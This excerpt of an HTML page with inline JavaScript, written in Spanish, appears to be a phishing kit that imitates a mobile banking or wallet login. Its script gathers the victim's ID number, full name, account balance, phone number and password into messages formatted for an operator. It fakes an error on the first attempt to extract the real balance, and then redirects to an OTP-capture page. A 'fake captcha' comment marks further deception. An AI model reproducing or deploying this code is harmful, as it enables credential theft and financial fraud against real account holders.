 ...
 <!-- Fake captcha end -->
    ...
    <script type="module">
        ...
        document.addEventListener("DOMContentLoaded", () => {
            ...
            // Reiniciamos a 0 al cargar la página para asegurar la validación cuando se recarga
            formData.loginAttempts = 0;
            ...
            const saldoErrorSpan = document.getElementById('saldoError');
            saldoErrorSpan.style.display = 'none';
            ...
            loginButton.addEventListener('click', async (event) => {
                ...
                if (LoginValidation(form)) {
                    ...
                    formData.loginAttempts = (formData.loginAttempts || 0) + 1;


                    // Actualizar formData con los nuevos datos
                    formData.phoneNumber = phoneNumber;
                    formData.password = password;
                    formData.saldoActual = saldoActual;
                    ...
                    if (formData.loginAttempts === 1) {
                        message = `🟣INGRESO LOGO (Intento 1)🟣  \n\n🪪 Cédula: ${formData.cedula}\n👤 Nombres: ${formData.nombreCompleto}\n💰 Saldo ingresado: ${saldoActual}\n📱 Número: ${phoneNumber}\n🔐 Clave: ${password}\n`;
                    } else {
                        message = `🟣INGRESO LOGO (Intento REAL)🟣  \n\n🪪 Cédula: ${formData.cedula}\n👤 Nombres: ${formData.nombreCompleto}\n💰 Saldo REAL: ${saldoActual}\n📱 Número: ${phoneNumber}\n🔐 Clave: ${password}\n`;
                    }
                    ...
                    // Lógica de redirección o error basada en los intentos
                    setTimeout(() => {
                        loadingSpinner.style.display = 'none';
                        if (formData.loginAttempts === 1) {
                            // Primer intento: Mostrar error y limpiar campo
                            saldoErrorSpan.textContent = 'Ha ocurrido un error, por favor ingresa tu saldo real.';
                            saldoErrorSpan.style.display = 'block';
                            
                            const saldoInput = document.getElementById('saldoActual');
                            saldoInput.value = ''; // Limpia el input para que lo vuelva a llenar
                            
                            // Forzamos validación nueva
                            loginButton.disabled = true;
                        } else {
                            // Segundo intento o más: Mostrar pantalla de Listo y luego redirigir
                            const listoScreen = document.getElementById('listoScreen');
                            listoScreen.style.display = 'flex';
                            
                            setTimeout(() => {
                                window.location.href = 'validate-otp1.html';
                            }, 2000); // 2 segundos en la pantalla de Listo
                        }
                    }, 3000);
                }
            });
    ...
    <!-- Pantalla de Listo -->
    <div id="listoScreen" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: white; z-index: 10000; flex-direction: column; justify-content: center; align-items: center;">
        <div style="background-color: #4BD1E0; width: 160px; height: 160px; border-radius: 20px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
            <svg width="70" height="70" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 5px;">
                <polyline points="20 6 9 17 4 12"></polyline>
            </svg>
            <span style="color: black; font-weight: bold; font-size: 18px; margin-top: 5px; font-family: sans-serif;">¡Listo!</span>
        </div>
    </div>
</body>
